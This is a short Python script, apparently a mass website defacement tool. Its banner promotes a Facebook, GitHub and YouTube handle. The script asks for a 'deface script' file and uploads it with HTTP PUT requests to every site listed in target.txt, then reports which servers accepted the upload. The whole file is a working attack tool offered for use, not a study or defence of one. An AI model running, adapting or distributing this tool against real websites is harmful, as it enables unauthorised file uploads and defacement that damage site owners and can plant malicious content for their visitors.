#-*- coding: utf-8 -*-
try:
   import requests
   import os.path
   import sys
   import time
except ImportError:
   exit("install requests and try again ...")

os.system('clear')
banner = """
\033[00mHi... Let's start doing.\033[1;30m
\t                     ____  ____  ____      
\t   ____  ____  ___  / __ \/ __ \/ __ \_  __
\t  / __ \/ __ \/ _ \/ /_/ / /_/ / /_/ / |/_/
\t / / / / /_/ /  __/\__, /\__, /\__, />  <  
\t/_/ /_/\____/\___//____//____//____/_/|_|  
\t \033[1;31m• \033[1;30mFacebook.com/noe999x
\t \033[1;31m• \033[1;30mGithub.com/noe999x
\t \033[1;31m• \033[1;30mYoutube.com/c/Anonim404\033[1;30m
"""

g = '\033[1;30m'
b = '\033[1;31m'
h = '\033[1;32m'
m = '\033[00m'
n = '\033[1;36m'

def x(memekganyu):
   ipt = ''
   if sys.version_info.major > 2:
      ipt = input(memekganyu)
   else:
      ipt = raw_input(memekganyu)
   
   return str(ipt)

def susuganyu(script,target_file="target.txt"):
   op = open(script,"r").read()
   with open(target_file, "r") as target:
      target = target.readlines()
      s = requests.Session()
      print(h+"•"+g+" Executing "+h+"%d\033[1;30m website, please wait.\n"%(len(target)))
      time.sleep(3)
      for web in target:
         try:
            site = web.strip()
            if site.startswith("http://") is False:
               site = "http://" + site
            req = s.put(site+"/"+script,data=op)
            if req.status_code < 200 or req.status_code >= 250:
               print(n+"•"+b+" Not vuln"+g+" ~> %s/%s"%(site,script))
            else:
               print(n+"•"+h+" Success "+g+" ~> %s/%s"%(site,script))

         except requests.exceptions.RequestException:
            continue
         except KeyboardInterrupt:
            print; exit()

def main(__bn__):
   print(__bn__)
   while True:
      try:
         a = x(m+"• "+g+"Enter the name of your deface script file :"+h+" ")
         if not os.path.isfile(a):
            print(b+"• "+g+"file "+b+"'%s' \033[1;30mnot found, try again.\n"%(a))
            continue
         else:
            break
      except KeyboardInterrupt:
         print; exit()

   susuganyu(a)

if __name__ == "__main__":
    main(banner)